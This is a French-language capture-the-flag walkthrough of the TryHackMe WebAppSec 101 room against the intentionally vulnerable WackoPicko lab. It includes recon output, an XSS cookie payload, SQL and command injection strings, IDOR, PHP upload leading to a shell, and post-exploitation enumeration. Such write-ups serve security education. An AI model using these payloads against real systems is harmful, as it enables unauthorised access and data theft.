
# WebAppSec 101
> In this room, we will walk through how to testing an application in the perspective of a hacker/penetration tester
https://tryhackme.com/room/webappsec101

10.10.56.202

## Reconnaissance initiale

### Nmap

```sh
22/tcp  open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: WackoPicko.com
111/tcp open  rpcbind syn-ack 2-4 (RPC #100000)
```

> Port 111 was designed by the Sun Microsystems as a component of their Network File System. It is also known as Open Network Computing Remote Procedure Call (ONC RPC). Port 111 is a port mapper with similar functions to Microsoft's port 135 or DCOM DCE.

### GoBuster

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target.thm
[+] Threads:        10
[+] Wordlist:       /opt/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/16 15:29:55 Starting gobuster
===============================================================
/images (Status: 301)
/comments (Status: 301)
/users (Status: 301)
/admin (Status: 301)
/upload (Status: 301)
/cart (Status: 301)
/pictures (Status: 301)
/css (Status: 301)
/action (Status: 200)
/server-status (Status: 403)
===============================================================
2020/06/16 15:42:13 Finished
===============================================================
```


## [Task 2] Walking through the application

### #1 what version of Apache is being used?

Le scan nmap nous donne la solution.

> Réponse: **2.4.7**

### #2 What language was used to create the website?

http://10.10.56.202/users/login.php

> Réponse: **php**

### #3 What version of this language is used? 

```sh
curl -v http://target.thm
* Connected to target.thm (10.10.56.202) port 80 (#0)
> GET / HTTP/1.1
> Host: target.thm
(...)
< HTTP/1.1 200 OK
< Date: Tue, 16 Jun 2020 19:53:43 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.24
```
> Réponse: **5.5.9**

## [Task 4] Authentication

http://10.10.56.202/admin/index.php?page=login

Test du compte (admin:admin) => ça marche !!!

### #3 What is the name of the cookie that can be manipulated?  

Authentification avec intrerception par Burpsuite nous donne :
```
HTTP/1.1 303 See Other
Date: Tue, 16 Jun 2020 20:23:49 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.24
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: session=5
Location: /admin/index.php?page=home
Content-Length: 0
Connection: close
Content-Type: text/html
```

> Réponse: **session**

> have you tried using this list: https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt

### #4 What is the username of a logged on user?

Après quelques tentative de manipulation du cookie `session` via Burpsuite, je me rends comtpe que je fait fausse route.

Reprenons, dans la phase de reconnaissance active manuelle, j'ai essayé de créer un compte (test:test).
Une fois connecté, on arrive sur une page "tableau de bord" qui fournit un lien pour afficher nos images.

http://10.10.56.202/users/view.php?userid=12

Cette page affiche le nom de l'utilisateur.

Essayons tout simplement de changer la valeur du paramètre `userid`.

http://10.10.56.202/users/view.php?userid=11

```These are bryce's Pictures: ```

> Réponse: **bryce**

### #5 What is the corresponding password to the username?

> Réponse: **bryce**

## [Task 5] Cross Site Scripting (XSS)

https://owasp.org/www-community/xss-filter-evasion-cheatsheet

```html
<script>alert(document.cookie)</script>
```

## [Task 6] Injection

### Command Injection

Dans la page de création de compte, il y a un lien vers une autre page permettant de tester la la complexité de notre mot de passe :
http://10.10.56.202/passcheck.php

Lorsque l'on poste un mot de passe, la page affiche : 

```
The command "grep ^azerty$ /etc/dictionaries-common/words" was used to check if the password was in the dictionary.
azerty is a Bad Password 
```

Essayons l'utilisation du pipe :

test | echo "<?php phpinfo ?>" > phpinfo.php

### Non-persistent SQLi 

Test d'injection via la page de login:

> `' OR 1=1`

L'injection fonctionne et nous retourne un beau message d'erreur qui nous dévoile une partie de la requete SQL utilisée.

```
you have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and `password` = SHA1( CONCAT('\' OR 1=1', `salt`)) limit 1' at line 1
```

Le mot de passe est "échapé", mais pas le login ! 

Il sufit donc d'ajouter un `;` et un `#` ou `--` pour commenter le reste de la requête !

> `' OR 1=1; #`

### Persistent SQLi

Autre injection possible via le formulaire de création de compte. Il est possible de créer un compte dont le login est `' OR 1=1`.
Une fois le compte créer, nous pouvons utiliser le lien "Who's got a similar name to you?" (http://10.10.56.202/users/similar.php) qui affiche la liste de tous les utilisateurs !

```
Sample User
bob
scanner1
scanner2
scanner3
scanner4
scanner5
wanda
calvinwatters
bryce
test
Smith
' OR 1=1
```

## Extra 

### Web browsing - manual

Le directory Listing est activé !

http://10.10.56.202/users/

http://10.10.56.202/users/login.php => page de login

Test d'injection SQL `' OR 1=1` => possible, à creuser.

```
you have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and `password` = SHA1( CONCAT('\' OR 1=1', `salt`)) limit 1' at line 1
```

http://10.10.56.202/users/register.php => page de création de compte

Test de création de compte (test:test) => OK, il est donc possible de créer un compte sans email valide ni vérification.

On peu donc ensuite acceder à la page permettant d'uploader des fichiers, normalement des images ... mais peu-être du php ?

http://10.10.56.202/pictures/upload.php

L'upload de fichier `.php` fonctionne !

Lorsque le fichier est uploadé, nous sommes redirigé vers la page permettant d'afficher l'image.

http://10.10.56.202/pictures/view.php?picid=17

L'analyse du code source montre que le fichier est inclu dans une balise `<img>`
```html
<img id="image" src="../upload/test/revshell.550.jpg" width="550" />
```

On peut donc facilement reconstruire le chemin : http://10.10.56.202/upload/test/revshell

Le fichier uploadé est renommé avec la valeur du champ "File name" du formulaire.
On note aussi que le fichier est déposé dans le dossier corresponand au champ "tag" du formulaire d'upload.

Nouvel upload en spécifiant cette fois le nom du fichier avec l'extention .php : OK

http://10.10.56.202/upload/test2/phpinfo.php

OK, on doit donc pouvoir upload un reverse shell PHP !

### Web Crawling 

https://jonathansblog.co.uk/website-crawler-software-kali-linux

#### skipfish
https://tools.kali.org/web-applications/skipfish


```sh
skipfish -o sf http://target.thm
```

> using the -O flag will tell skipifsh not to submit any forms, and -Y will tell skipfishn not to fuzz directories

```sh
skipfish -o sf2 -O -Y http://target.thm
```

Analyse du rapport Skipfish : file:///home/kali/thm/webappsec101/sf2/index.html

**Directory traversal / file inclusion possible (1)**

http://target.thm/admin/index.php?page=./test

```
Warning: require_once(./test.php): failed to open stream: No such file or directory in /app/admin/index.php on line 4
Fatal error: require_once(): Failed opening required './test.php' (include_path='.:/usr/share/php:/usr/share/pear') in /app/admin/index.php on line 4
```

> Ajoute automatiquement l'extention `.php`.








### Pown the box !

```sh
Linux d0956fa8d01b 4.14.77-70.59.amzn1.x86_64 #1 SMP Mon Nov 12 22:02:45 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 21:23:46 up 12 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


```sh
find / -perm -4000 2>/dev/null
/usr/lib/pt_chown
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/bin/umount
/bin/ping
/bin/ping6
/bin/su
/bin/mount
```

```sh
cat /etc/os-release 
NAME="Ubuntu"
VERSION="14.04.3 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.3 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
```

```
www-data@d0956fa8d01b:/$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 5.5.47-0ubuntu0.14.04.1 (Ubuntu)
```